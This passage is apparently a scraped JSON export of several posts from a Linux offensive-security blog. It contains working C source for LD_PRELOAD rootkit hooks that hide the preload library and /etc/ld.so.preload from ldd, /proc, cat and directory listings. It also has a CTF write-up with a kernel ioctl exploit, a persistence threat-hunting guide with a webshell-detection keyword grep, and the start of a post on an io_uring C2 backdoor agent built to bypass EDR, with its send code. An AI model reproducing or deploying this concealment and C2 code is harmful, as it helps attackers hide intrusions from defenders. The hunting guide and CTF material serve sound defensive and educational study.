new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust 